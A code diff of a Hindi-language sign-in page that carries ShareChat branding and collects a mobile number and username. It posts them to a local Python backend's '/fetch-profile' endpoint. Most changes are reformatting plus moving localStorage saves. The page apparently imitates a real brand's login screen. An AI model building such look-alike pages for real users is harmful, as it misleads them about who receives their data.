@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html lang="hi">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in</title>
 
   <link href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap" rel="stylesheet">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📱</text></svg>">
+  <link rel="icon"
+    href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📱</text></svg>">
 
   <style>
     * {
@@ -232,44 +234,44 @@
       .container {
         padding: max(16px, env(safe-area-inset-top)) max(20px, env(safe-area-inset-right)) max(36px, env(safe-area-inset-bottom)) max(20px, env(safe-area-inset-left));
       }
-      
+
       .logo {
         width: 72px;
         height: 72px;
         margin: 30px auto 24px;
       }
-      
+
       .logo-img {
         width: 66px;
         height: 66px;
       }
-      
+
       h1 {
         font-size: 1.6rem;
       }
-      
+
       .subtitle {
         font-size: 0.9rem;
         margin-bottom: 24px;
       }
-      
+
       .input-group select,
       .input-group input {
         height: 48px;
         padding: 12px 10px;
         font-size: 0.95rem;
       }
-      
+
       .input-group select {
         width: 80px;
         min-width: 80px;
       }
-      
+
       .btn {
         padding: 15px 0;
         font-size: 1rem;
       }
-      
+
       .app-badges img {
         height: 38px;
       }
@@ -298,7 +300,7 @@
       .input-group {
         border-width: 2px;
       }
-      
+
       .btn {
         border: 2px solid #212936;
       }
@@ -319,7 +321,8 @@
   <div class="container">
 
     <span class="logo">
-      <img class="logo-img" src="https://cdn.iconscout.com/icon/free/png-256/free-sharechat-1136710.png" alt="ShareChat Logo" loading="lazy">
+      <img class="logo-img" src="https://cdn.iconscout.com/icon/free/png-256/free-sharechat-1136710.png"
+        alt="ShareChat Logo" loading="lazy">
     </span>
 
     <h1>Sign in</h1>
@@ -332,29 +335,13 @@
         <select aria-label="Country code">
           <option value="+91">+91</option>
         </select>
-        <input 
-          type="tel" 
-          id="mobile" 
-          placeholder="मोबाइल नंबर" 
-          maxlength="10" 
-          required 
-          inputmode="numeric"
-          pattern="[0-9]{10}"
-          aria-label="मोबाइल नंबर"
-          autocomplete="tel"
-        >
+        <input type="tel" id="mobile" placeholder="मोबाइल नंबर" maxlength="10" required inputmode="numeric"
+          pattern="[0-9]{10}" aria-label="मोबाइल नंबर" autocomplete="tel">
       </div>
 
       <!-- Username -->
       <div class="input-group">
-        <input 
-          type="text" 
-          id="username" 
-          placeholder="यूज़रनेम" 
-          required
-          aria-label="यूज़रनेम"
-          autocomplete="username"
-        >
+        <input type="text" id="username" placeholder="यूज़रनेम" required aria-label="यूज़रनेम" autocomplete="username">
       </div>
 
       <div class="terms">
@@ -373,10 +360,12 @@
     <div class="download-text">शेयरचेट ऐप डाउनलोड करें</div>
     <div class="app-badges">
       <a href="https://play.google.com/store" aria-label="Download from Google Play Store">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play Store" loading="lazy">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
+          alt="Google Play Store" loading="lazy">
       </a>
       <a href="https://apps.apple.com" aria-label="Download from App Store">
-        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" loading="lazy">
+        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store"
+          loading="lazy">
       </a>
     </div>
 
@@ -390,14 +379,14 @@
     const usernameInput = document.getElementById('username');
 
     // Mobile number validation
-    mobileInput.addEventListener('input', function(e) {
+    mobileInput.addEventListener('input', function (e) {
       this.value = this.value.replace(/\D/g, '').slice(0, 10);
     });
 
     // Form submission
-    loginForm.addEventListener('submit', async function(e) {
+    loginForm.addEventListener('submit', async function (e) {
       e.preventDefault();
-      
+
       const mobile = mobileInput.value.trim();
       const username = usernameInput.value.trim();
 
@@ -419,14 +408,8 @@
       submitBtn.disabled = true;
 
       try {
-        // Store in localStorage
-        localStorage.setItem("userMobile", mobile);
-        localStorage.setItem("userUsername", username);
-        localStorage.setItem("loginTime", new Date().toISOString());
-
-        // Send data to our Python backend
         console.log("📱 Sending data to backend...");
-        
+
         const response = await fetch('/fetch-profile', {
           method: 'POST',
           headers: {
@@ -443,52 +426,57 @@
         }
 
         const result = await response.json();
-        
         console.log("Backend response:", result);
 
-        if (result.status === 'success') {
-          // Show success message with profile details
-          const profile = result.profile;
-          let message = `✅ Profile fetched successfully!\n\n`;
-          message += `Name: ${profile.name || 'N/A'}\n`;
-          message += `Username: ${username}\n`;
-          message += `Followers: ${profile.followers || '0'}\n`;
-          message += `Following: ${profile.following || '0'}\n`;
-          message += `Posts: ${profile.posts || '0'}`;
-          
-        // ✅ SAVE DATA FOR profile.html
-        localStorage.setItem("fetchedProfileData", JSON.stringify(profile));
+        // ✅ SUCCESS CHECK (case-safe)
+        if (result.status && result.status.toLowerCase() === 'success') {
 
-        // ✅ REDIRECT TO PROFILE PAGE
-        window.location.href = "/profile.html";
-        return;
-      } else {
-        alert(`❌ Error: ${result.message}`);
-      }
+          const profile = result.profile;
+
+          // ✅ AB SAVE KARO (RIGHT PLACE)
+          localStorage.setItem("userMobile", mobile);
+          localStorage.setItem("userUsername", username);
+          localStorage.setItem("loginTime", new Date().toISOString());
+          localStorage.setItem("fetchedProfileData", JSON.stringify(profile));
+
+          // ✅ REDIRECT
+          window.location.href = "/profile.html";
+          return;
+
+        } else {
+          // ❌ INVALID USER
+          alert(result.message || "❌ Invalid mobile number or username");
+          return;
+        }
 
       } catch (error) {
         console.error("Error:", error);
-        
-        if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
-          alert("⚠️ Backend server is not running.\n\nPlease make sure the Python tool is running and then try again.");
+
+        if (
+          error.message.includes('Failed to fetch') ||
+          error.message.includes('NetworkError')
+        ) {
+          alert("⚠️ Backend server is not running.\n\nPlease start Python server.");
         } else {
-          alert(`एरर आया है: ${error.message}\n\nकृपया दोबारा कोशिश करें।`);
+          alert(`❌ Error: ${error.message}`);
         }
+
       } finally {
         submitBtn.classList.remove('loading');
         submitBtn.disabled = false;
       }
+
     });
 
     // Handle Enter key navigation
-    mobileInput.addEventListener('keydown', function(e) {
+    mobileInput.addEventListener('keydown', function (e) {
       if (e.key === 'Enter') {
         e.preventDefault();
         usernameInput.focus();
       }
     });
 
-    usernameInput.addEventListener('keydown', function(e) {
+    usernameInput.addEventListener('keydown', function (e) {
       if (e.key === 'Enter') {
         e.preventDefault();
         submitBtn.click();
@@ -496,7 +484,7 @@
     });
 
     // Check if we have saved data
-    window.addEventListener('load', function() {
+    window.addEventListener('load', function () {
       // Test localStorage availability
       try {
         localStorage.setItem('test', 'test');
@@ -508,14 +496,14 @@
       // Load saved data if exists
       const savedMobile = localStorage.getItem("userMobile");
       const savedUsername = localStorage.getItem("userUsername");
-      
+
       if (savedMobile) {
         mobileInput.value = savedMobile;
       }
       if (savedUsername) {
         usernameInput.value = savedUsername;
       }
-      
+
       // Check backend connection
       checkBackendConnection();
     });
@@ -523,7 +511,7 @@
     // Function to check backend connection
     async function checkBackendConnection() {
       try {
-        const response = await fetch('/', { 
+        const response = await fetch('/', {
           method: 'GET',
           mode: 'no-cors' // Use no-cors to avoid CORS issues for simple check
         });
@@ -534,4 +522,5 @@
     }
   </script>
 </body>
+
 </html>
